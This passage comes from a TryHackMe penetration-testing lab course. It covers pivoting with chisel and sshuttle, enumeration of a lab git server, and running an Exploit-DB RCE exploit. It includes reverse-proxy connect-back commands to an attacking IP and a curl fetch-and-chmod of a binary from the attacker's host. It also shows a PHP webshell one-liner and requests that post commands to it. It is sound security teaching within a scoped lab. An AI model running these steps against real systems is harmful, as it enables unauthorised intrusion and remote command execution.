a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It\'s written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn\'t require SSH access on the compromised target is a big bonus.<br /></p><p>Before we can use chisel, we need to download appropriate binaries from the tool\'s <a href="https://github.com/jpillora/chisel/releases" target="_blank">Github release page</a>. These can then be unzipped using <code>gunzip</code>, and executed as normal:</p><p><img style="width:1075px" alt="Demonstrating a download and unzip of the chisel tool set using wget for the tar.gz files from github, then gunzip to decompress the files" src="https://assets.tryhackme.com/additional/wreath-network/490577b29cce.png" /></p><p>You must have an appropriate copy of the chisel binary on <i>both the attacking machine and the compromised server.</i> Copy the file to the remote server with your choice of file transfer method. You could use the webserver method covered in the previous tasks, or to shake things up a bit, you could use SCP:<br /><code>scp -i KEY chisel user@target:/tmp/chisel-USERNAME</code></p><hr /><p>The chisel binary has two modes: <i>client</i> and <i>server</i>. You can access the help menus for either with the command: <code>chisel client|server --help</code><br />e.g:<br /><img style="width:751px" alt="Demonstrating the chisel server help menu with chisel server --help" src="https://assets.tryhackme.com/additional/wreath-network/9435cdc6e54d.png" /></p><p><em><br /></em></p><p>We will be looking at two uses for chisel in this task (a SOCKS proxy, and port forwarding); however, chisel is a very versatile tool which can be used in many ways not described here. You are encouraged to read through the help pages for the tool for this reason.<em><br /></em></p><hr /><p><em><i><u><b><span style="font-size:18px">Reverse SOCKS Proxy:</span></b></u></i><br /></em>Let\'s start by looking at setting up a reverse SOCKS proxy with chisel. This connects <i>back</i> from a compromised server to a listener waiting on our attacking machine.<br /></p><p>On our own attacking box we would use a command that looks something like this:<br /><code>./chisel server -p LISTEN_PORT --reverse &amp;<br /></code></p><p>This sets up a listener on your chosen <code>LISTEN_PORT</code>. <br /></p><p>On the compromised host, we would use the following command:<br /><code>./chisel client ATTACKING_IP:LISTEN_PORT R:socks &amp;</code><br /></p><p>This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (<code>&amp;</code>) to background the processes.</p><p><img style="width:758px" alt="Demonstrating a successful connection with chisel" src="https://assets.tryhackme.com/additional/wreath-network/a27fb82676b4.png" /></p><p>Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on <code>127.0.0.1:1080</code>. As such, we will be using port 1080 when sending data through the proxy.</p><p>Note the use of <code>R:socks</code> in this command. "R" is prefixed to <i>remotes</i> (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. <br /></p><p><em><u><i><b><span style="font-size:18px">Forward SOCKS Proxy:</span></b></i></u><br /></em>Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it\'s still well worth learning how to set up a forward proxy with chisel.<br /></p><p>In many ways the syntax for this is simply reversed from a reverse proxy.</p><p>First, on the compromised host we would use:<br /><code>./chisel server -p LISTEN_PORT --socks5</code><br /></p><p>On our own attacking box we would then use:<br /><code>./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks</code><br /></p><p>In this command, <code>PROXY_PORT</code> is the port that will be opened for the proxy.</p><p>For example, <code>./chisel client 172.16.0.10:8080 1337:socks</code> would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.<br /></p><p><u><b>Proxychains Reminder:</b></u><br />When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from <code>socks4</code> to <code>socks5</code>:<br /><code>[ProxyList]<br /># add proxy here ...<br /># meanwhile<br /># defaults set to "tor"<br />socks5\xa0 127.0.0.1 1080<br /></code><br /></p><p><b><i>Note:</i></b><i> The above configuration is for a reverse SOCKS proxy -- as mentioned previously, the proxy opens on port 1080 rather than the specified listening port (1337). If you use proxychains with a forward proxy then the port should be set to whichever port you opened (1337 in the above example).</i><br /></p><hr /><p>Now that we\'ve seen how to use chisel to create a SOCKS proxy, let\'s take a look at using it to create a port forward with chisel.</p><p><em><u><b><span style="font-size:18px">Remote Port Forward:</span></b></u><i><u><b><span style="font-size:18px"></span></b></u><u><b><span style="font-size:18px"><br /></span></b></u></i></em>A remote port forward is when we connect back from a compromised target to create the forward.<br /></p><p>For a remote port forward, on our attacking machine we use the exact same command as before:<br /><code>./chisel server -p LISTEN_PORT --reverse &amp;</code></p><p>Once again this sets up a chisel listener for the compromised host to connect back to. <br />The command to connect back is slightly different this time, however:<br /><code>./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &amp;</code></p><p>You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the <code>LISTEN_PORT</code> and the <code>LOCAL_PORT</code>. Here the <code>LISTEN_PORT</code> is the port that we started the chisel server on, and the <code>LOCAL_PORT</code> is the port we wish to open on our own attacking machine to link with the desired target port.<br /></p><p>To use an old example, let\'s assume that our own IP is 172.16.0.20, the compromised server\'s IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:<br /><code>./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &amp;</code><br /></p><p>Connecting back to our attacking machine, functioning as a chisel server started with:<br /><code>./chisel server -p 1337 --reverse &amp; </code><br /></p><p>This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.</p><p><em><i><u><b><span style="font-size:18px">Local Port Forward:</span></b></u></i><br /></em>As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.</p><p>On the compromised target we set up a chisel server:<br /><code>./chisel server -p LISTEN_PORT</code><br /></p><p>We now connect to this from our attacking machine like so:<br /><code>./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT</code><br /></p><p>For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:<br /><code>./chisel client 172.16.0.5:8000 2222:172.16.0.10:22</code><br /></p><p><br /></p><hr /><p>As with the backgrounded socat processes, when we want to destroy our chisel connections we can use <code>jobs</code> to see a list of backgrounded jobs, then <code>kill %NUMBER</code> to destroy each of the chisel processes.</p><p><i><b>Note: </b>When using Chisel on Windows, it\'s important to remember to upload it with a file extension of </i><code>.exe</code><i> (e.g. </i><code>chisel.exe</code><i>)!</i><br /><em></em></p>', 'taskType': 'none', 'taskNo': 14, 'taskCreated': '2021-01-06T19:23:49.674Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What command would you use to start a chisel server for a reverse connection on your attacking machine?</p><p>Use port 4242 for the listener and <b>do not</b> background the process.<br /></p>', 'hint': 'Assume that the copy of chisel is called "chisel" and is in your current directory.'}, {'questionNo': 2, 'question': '<p>What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?</p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> sshuttle', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/1hkXgz-qttY" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Finally, let\'s take a look at our last tool of this section: <a href="https://github.com/sshuttle/sshuttle" target="_blank">sshuttle</a>.</p><p>This tool is quite different from the others we have covered so far. It doesn\'t perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy <i>without the use of proxychains</i> (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server. <br /></p><p>Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it <i>is</i> an option, it tends to be a superb bet!</p><p>First of all we need to install sshuttle. On Kali this is as easy as using the <code>apt</code> package manager:<br /><code>sudo apt install sshuttle</code><br /></p><hr /><p>The base command for connecting to a server with sshuttle is as follows:<br /><code>sshuttle -r username@address subnet\xa0 </code><br /></p><p>For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:<br /><code>sshuttle -r user@172.16.0.5 172.16.0.0/24</code><br /></p><p>We would then be asked for the user\'s password, and the proxy would be established. The tool will then just sit passively in the background and <img style="width:200px;margin:30px;float:right" src="https://assets.tryhackme.com/additional/wreath-network/OWFkMzlhNjkw.png" class="note-float-right" />forward relevant traffic into the target network.<br /></p><p>Rather than specifying subnets, we could also use the <code>-N</code> option which attempts to determine them automatically based on the compromised server\'s own routing table:<br /><code>sshuttle -r username@address -N</code><br /></p><p>Bear in mind that this may not always be successful though!<br /></p><p>As with the previous tools, these commands could also be backgrounded by appending the ampersand (<code>&amp;</code>) symbol to the end.</p><p>If this has worked, you should see the following line:<br /><code>c : Connected to server.</code><br /></p><hr /><p>Well, that\'s great, but what happens if we don\'t have the user\'s password, or the server only accepts key-based authentication?</p><p>Unfortunately, sshuttle doesn\'t currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the <code>--ssh-cmd</code> switch.</p><p>This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply <code>ssh</code> with no arguments. With the <code>--ssh-cmd</code> switch, we can pick a different command to execute for authentication: say, <code>ssh -i keyfile</code>, for example!</p><p>So, when using key-based authentication, the final command looks something like this:<br /><code>sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET</code><br /></p><p>To use our example from before, the command would be:<br /><code>sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24</code><br /></p><hr /><p><b>Please Note:</b> When using sshuttle, you may encounter an error that looks like this:<br /><code>client: Connected.<br />client_loop: send disconnect: Broken pipe<br />client: fatal: server died with error code 255</code><br /></p><p>This can occur when the compromised machine you\'re connecting to is part of the subnet you\'re attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.</p><p>To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the <code>-x</code> switch.</p><p>To use our earlier example:<br /><code>sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5</code><br /></p><p>This will allow sshuttle to create a connection without disrupting itself.<br /></p>', 'taskType': 'none', 'taskNo': 15, 'taskCreated': '2021-01-06T20:20:13.211Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?<br /></p>', 'hint': 'Use Double quotes, as in the task.'}, {'questionNo': 3, 'question': '<p>You are trying to use sshuttle to connect to 172.16.0.100.\xa0 You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.</p><p>What switch (and argument) could you use to fix this error?<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge size-16" style="background:rgba(178,178,178,.3);color:rgba(255,255,255,0.85)">Pivoting</span> Conclusion', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/3DFvx6TDSxE" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>That was a long and theory-heavy section, so kudos for getting this far!</p><p>The big take away from this section is: there are <i>many</i> different ways to pivot through a network. Further research in your own time is highly recommended, as there are a great many interesting techniques which we haven\'t had time to cover here (for example, on a fully rooted target, it\'s possible to use the installed firewall -- e.g. iptables or Windows Firewall -- to create entry points into an otherwise inaccessible network. Equally, it\'s possible to set up a route manually in the routing table of your attacking machine to, routing your traffic into the target network without requiring a proxy-tool like Proxychains or Foxyproxy). </p><p>As a summary of the tools in this section:</p><ul><li>Proxychains and FoxyProxy are used to access a proxy created with one of the other tools</li><li>SSH can be used to create both port forwards, and proxies</li><li>plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows</li><li>Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways</li><li>Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn\'t require SSH access on the box</li><li>sshuttle is a nicer way to create a proxy when we have SSH access on a target<br /></li></ul><p>Pivoting truly is a vast topic; however, hopefully you\'ve learnt something by covering the theory in this section!</p><p>This is a good time to experiment with the techniques demonstrated in \nthe pivoting section, so play around with them all and make sure you\'re \ncomfortable with them before moving on.</p><p><i><b>Note:</b> If using socat, or any other techniques that open up a port on the compromised host (in the course of this network), please make sure to use a port <u>above</u> 15000, for the sake of other users in earlier sections of the course.</i></p>', 'taskType': 'none', 'taskNo': 16, 'taskCreated': '2021-01-08T00:28:53.435Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read the conclusion and experiment with the pivoting techniques demonstrated.<br />', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Git Server</span> Enumeration', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/Q5b60n-jkf0" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>It\'s time to put your newfound knowledge to the test!</p><p>Download a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true" target="_blank">static nmap binary</a>. Rename it to <code>nmap-USERNAME</code>, substituting in your own TryHackMe username. Finally, upload it to the target in a manner of your choosing. </p><p><b>For example, with a Python webserver:-</b></p><p>On Kali (inside the directory containing your Nmap binary):</p><p><code>sudo python3 -m http.server 80</code></p><p>Then, on the target:</p><p><code>curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME &amp;&amp; chmod +x /tmp/nmap-USERNAME<br /></code></p><p><img style="width:973px" alt="Using cURL and a Python HTTP server to upload nmap to the target" src="https://assets.tryhackme.com/additional/wreath-network/f621bb960163.png" /></p><hr />Now use the binary to scan the network. The command will look something like this:<p></p><p><code>./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME</code></p><p>You will need to substitute in your username, and the correct IP range. For example:</p><p><code>./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle</code></p><p>Here the <code>-sn</code> switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.<br /></p><p>Note that this would also work with CIDR notation (e.g. 10.x.x.0/24).<br /></p><p>Use what you\'ve learnt to answer the following questions!</p><p><i><b>Note: </b>The host ending in </i><code>.250</code><i> is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same goes for the host ending in </i><code>.1</code><i> (part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers.</i><br /></p>', 'taskType': 'none', 'taskNo': 17, 'taskCreated': '2021-01-06T00:12:47.972Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Excluding the out of scope hosts, and the current host (<code>.200</code>), how many hosts were discovered active on the network?<br />', 'hint': 'The network diagram at the top of the screen is a give-away here.'}, {'questionNo': 2, 'question': '<p>In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)</p>', 'hint': "Don't put a space between the two numbers."}, {'questionNo': 3, 'question': '<p>Scan the hosts -- which one does <i>not</i> return a status of "filtered" for every port (submit the last octet only)?<br /></p>', 'hint': ''}, {'questionNo': 4, 'question': "<p>Let's assume that the other host is inaccessible from our current position in the network.</p><p>Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?<br /></p>", 'hint': 'Scan the first 15000 ports. In some instances port 5357 will also show as being open. If this is the case, please disregard it and use the other three.'}, {'questionNo': 5, 'question': "<p>We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).</p><p>Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?<br /></p>", 'hint': 'Service name, not the port number.'}, {'questionNo': 6, 'question': '<p>Now that we have an idea about the other hosts on the network, we can start looking at some of the tools and techniques we could use to access them!<br /></p>', 'hint': ''}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Git Server</span> Pivoting', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/D2wSFFrpPQA" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>Thinking about the interesting service on the next target that we discovered in the previous task, pick a pivoting technique and use it to connect to this service, \nusing the web browser on your attacking machine!\xa0 </p><p>As a word of \nadvice: sshuttle is highly recommended for \ncreating an initial access point into the rest of the network. This is because the firewall on the CentOS target will prove problematic with some of the techniques shown here. We will learn how to mitigate against this later in the room, although if you\'re comfortable opening up a port using firewalld then port forwarding or a proxy would also work.</p>', 'taskType': 'none', 'taskNo': 18, 'taskCreated': '2021-01-06T20:21:14.667Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the name of the program running the service?<br />', 'hint': 'When you first connect to the service you will see an error screen with three expected routing patterns given. The second pattern (without the symbols at the start and end) is the answer to this question. Append it to the URL to get to a login screen.'}, {'questionNo': 2, 'question': '<p>Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:<br /><code>http://IP/ANSWER</code><br /></p><p>When navigating to this URI, we are given the following login page:<br /><img style="width:349px" alt="Image showing the login screen for the service" src="https://assets.tryhackme.com/additional/wreath-network/409f76a17496.png" /><br /></p><p>Do these default credentials work (Aye/Nay)?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>Shucks -- it couldn't be that easy, huh? Back to the drawing board then!</p><p>Use the command: <code>searchsploit SERVICENAME</code>, on Kali to search for exploits related to this service.<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': '<p>You will see that there are three publicly available exploits.</p>There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?', 'hint': 'The EDB ID number is given as part of the exploit name. Look under the "Path" column of the results table. You\'re looking for an exploit called NUMBER.py. The number (by itself, without the file extension) is the answer to this question.'}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Git Server</span> Code Review', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/vnwUTeIXbxM" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:rgb(54, 64, 84);--darkreader-inline-color:#d9d0c0"><i class="fas fa-play-circle"></i></span><br /><span style="color:rgb(54, 64, 84);position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer;--darkreader-inline-color:#d9d0c0"><b>Video</b></span></a></span><p>In the previous task we found an exploit that might work against the service running on the second server.</p><p>Make a copy of this exploit in your local directory using the command:<br /><code>searchsploit -m EDBID</code><br /></p><img style="width:616px" alt="Using searchsploit to copy the exploit to the local directory" src="https://assets.tryhackme.com/additional/wreath-network/74c9d9ad5c3a.png" /><p></p><p>Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, \nwhich can cause problems in scripts when executed on Linux:</p><p><img style="width:658px" alt="Demonstration of the line endings error which can occur when trying to run scripts written on Windows on a Linux machine" src="https://assets.tryhackme.com/additional/wreath-network/c8bf9c7b639a.png" /><br /></p><p> </p><p>Before we \ncan use the exploit, we must convert these into Linux line endings using\n the dos2unix tool:<br /><code>dos2unix ./EDBID.py</code></p><p>This\xa0 can also be done manually with <code>sed</code> if <code>dos2unix</code> is unavailable:<br /><code>sed -i \'s/\\r//\' ./EDBID.py</code><br /></p><hr /><p></p><p>With the file converted, it\'s time to read through the exploit to make sure we know what it\'s doing. The fact that the exploit is on Exploit-DB means that it\'s unlikely to be outright malicious, but there\'s no guarantee that it will <i>work</i>, or do anything close to exploiting a vulnerabilty in the service.</p><p></p><p>Open the exploit in your favourite text editor and let\'s get going!<br /></p><p></p>', 'taskType': 'none', 'taskNo': 19, 'taskCreated': '2021-01-08T16:22:53.179Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Look at the information at the top of the script. On what date was this exploit written?<br />', 'hint': ''}, {'questionNo': 2, 'question': '<p>As this is a Python script, the version of the language used to write the software matters. Many older exploits are still written in Python2. These exploits tend to be incompatible with the Python3 interpreter, and vice versa. </p><p>Before we can do anything else, we need to determine whether this exploit was written in Python2 or Python3. A quick way of doing this is to look for the <code>print</code> statements (used to echo output to the console).\xa0 If there are no round brackets (e.g. <code>print "Hello World!"</code>) then the exploit will be Python2, otherwise the exploit is likely to be Python3 (e.g. <code>print("Hello World!")</code>). Of course, this is far from the only way to check, but it will work for our purposes.</p><p>Bearing this in mind, is the script written in Python2 or Python3?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': "<p>Now that we know which version of Python we're dealing with we can execute it in one of two ways:</p><ul><li>Using the appropriate interpreter directly (e.g. <code>python3 exploit.py</code> / <code>python2 exploit.py</code>)</li><li>Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: <code>#!</code>. You then specify the absolute path to the interpreter, so: <code>#!/usr/bin/python3</code> / <code>#!/usr/bin/python2</code> / <code>#!/bin/sh</code>, etc. This means that if we execute the script using <code>./exploit.py</code>, it will be executed by the correct interpreter.</li></ul><p>Add an appropriate shebang to the exploit, at the very top of the file!<br /></p>", 'hint': ''}, {'questionNo': 4, 'question': '<p>Let\'s have a look through some of the key sections of the code.</p><p>This\n script is not designed to be fancy. It does what we need it to do, and \nnothing more. All configurations are done within the code by literally \nediting the script, so it\'s important that we understand the options \navailable to us. These can be found in lines 23-31 (offset by minus one if you didn\'t add the shebang):<br /><img style="width:301px" alt="Lines 23-31 of the exploit" src="https://assets.tryhackme.com/additional/wreath-network/b6d7392de1b7.png" /><br /></p><p>Realistically\n we are only interested in the first two variables here, as the \nother options should be fine at their default values. The two variables \nwe care about are <code>ip</code> and <code>command</code>, allowing us to specify our target and the command to run, respectively.</p><p>Set the IP to the correct target for your choice of pivoting technique. If you used sshuttle or one of the proxying techniques then this will just be the IP of the target. If you used a port forward then it will be <code>localhost:chosen_port</code>, e.g.:<br /><code>localhost:8000</code><br /></p><p>For the time being we will leave the command as it is. <code>whoami</code> is as good a command as any to confirm that the exploit works.<br /></p><p>The\n bulk of the middle section of the code is taking advantage of the \nimproper access controls which make this vulnerability possible. We will\n not cover this in detail in order to keep this task relatively short; \nhowever, reading through the exploit (and trying to understand it) would\n be highly advisable.</p><p>We are, however, interested in the last 6 lines of the exploit:<br /><img style="width:921.8px" alt="Last six lines of the exploit set to the default values" src="https://assets.tryhackme.com/additional/wreath-network/0c95035c81e7.png" /><br /></p><p>These create a PHP webshell (<code>&lt;?php system($_POST[\'a\']); ?&gt;</code>) and echo it into a file called <code>exploit.php</code> under the webroot. This can then be accessed by posting a command to the newly created <code>/web/exploit.php</code> file.</p><p>For the sake of not spoiling things for other users, we are going to alter this before running the script.</p><p>We can leave the payload as it is, but we will alter both instances of "exploit.php" in the script to be <code>exploit-USERNAME.php</code>, for example:<br /><img style="width:921.8px" alt="Last six lines of the exploit when altered to include a username" src="https://assets.tryhackme.com/additional/wreath-network/312cae5fdfc7.png" /><br /></p><hr /><p>Having added in a shebang, changed the target, and updated the name of the exploit.php file, the exploit should now be fully configured so we will perform the exploit in the next task.</p><p>Just to confirm that you have been paying attention to the script: What is the <i>name</i> of the cookie set in the POST request made on line 74 (line 73 if you didn\'t add the shebang) of the exploit? <br /></p>', 'hint': 'Check the cookies={} parameter in the post request. The answer is the first string in the dictionary of cookies passed into the function.'}]}, {'taskTitle': '<span class="badge badge-soft-warning size-16">Git Server</span> Exploitation', 'taskDesc': '<span style="text-align:center;text-decoration:none;position:fixed;right:20px;bottom:20px;z-index:9999"><a href="https://youtu.be/qzqIregBG7A" target="_blank"><span style="cursor:pointer;font-size:70px;text-decoration:none;color:#364054"><i class="fas fa-play-circle"></i></span><br /><span style="color:#364054;position:relative;top:-15px;text-align:center;text-decoration:none;cursor:pointer"><b>Video</b></span></a></span><p>In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.</p><p>It is now time to run the exploit!<br /><img style="width:695px" alt="Exploit PoC in action!" src="https://assets.tryhackme.com/additional/wreath-network/d7bd5d950eae.png" /><br /></p><p>Success!</p><p>Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\\SYSTEM, the highest ranking local account on a Windows target.</p><p>From here we want to obtain a full reverse shell. We have two options for this:</p><ol><li>We could change the command in the exploit and re-run the code</li><li>We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice</li></ol><p>Option number two is a lot quieter than option number 1, so let\'s use that.</p><hr /><p>The webshell we have uploaded responds to a POST request using the parameter "<code>a</code>" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.</p><p><b><u>With cURL:</u></b><br /><code>curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"</code><br /></p><p><img style="width:958px" alt="Using cURL to activate the webshell, gaining the same result as in the previous screenshot" src="https://assets.tryhackme.com/additional/wreath-network/c4fb965ea6f5.png" /></p><p><i><b>Note:</b> in this screenshot, </i><code>gitserver.thm</code><i> has been added to the </i><code>/etc/hosts</code><i> file on the attacking machine, mapped to the target IP address.</i><br /></p><p><b><u>With BurpSuite:</u></b><br />We first turn on our Burp proxy (see the <a href="https://tryhackme.com/room/rpburpsuite" target="_blank">Burpsuite room</a> if you need help with this!) and navigate to the exploit URL:<br /><img style="width:722px" alt="Capturing a request with BurpSuite" src="https://assets.tryhackme.com/additional/wreath-network/3b9c350a53d8.png" /></p><p>We then press <code>Ctrl + R</code> to send the request to Repeater on the top menu.<br /></p><p>Next we change the "GET" on line 1 to "POST". We then add a <code>Content-Type</code> header on line 9 to tell the server to accept POST paramters:<br /><code>Content-Type: application/x-www-form-urlencoded</code><br /></p><p> Finally, on line 11 we add <code>a=COMMAND</code>:<br /><img style="width:708px" alt="The altered request with POST, the content-type header, and the payload (a=whoami) highlighted" src="https://assets.tryhackme.com/additional/wreath-network/640de3e036a9.png" /><br /></p><p>Press send, and see the response come in!<br /><img style="width:793px" alt="Activated the webshell with Burpsuite" src="https://assets.tryhackme.com/additional/wreath-network/063482e92f8b.png" /><br /></p><hr /><p>With two methods available, pick your favourite and we\'ll aim for a shell!</p><p><br /></p>', 'taskType': 'none', 'taskNo': 20, 'taskCreated': '2021-01-09T01:28:48.948Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<b>Bonus Question (Optional): </b>Using the given code for the exploit \nwe used against the web server, see if you can adapt this exploit to \ncreate a full pseudoshell environment.', 'hint': ''}, {'questionNo': 2, 'question': "<p>First up, let's use some basic enumeration to get to grips with the webshell:</p>What is the hostname for this target?", 'hint': 'Use the "hostname" command.'}, {'questionNo': 3, 'question': 'What operating system is this target?', 'hint': 'The task will give you the answer to this. Otherwise try out some different operating system specific commands (e.g. "systeminfo" for Windows, "uname" for Linux, etc) and see what the system responds to.'}, {'questionNo': 4, 'question': 'What user is the server running as?', 'hint': 'We are currently executing commands in the context of the server, so just use whoami to get the answer. This may or may not be already shown in the task above.'}, {'questionNo': 5, 'question': '<p>Before we go for a reverse shell, we need to establish whether or not\n this target is allowed to connect to the outside world. The typical way\n of doing this is by executing the <code>ping</code> command on the \ncompromised server to ping our own IP and using a network interceptor \n(Wireshark, TCPDump, etc) to see if the ICMP echo requests make it \nthrough. If they do then network connectivity is established, otherwise \nwe may need to go back to the drawing board.</p><p>To start up a TCPDump listener we would use the following command:<br /><code>tcpdump -i tun0 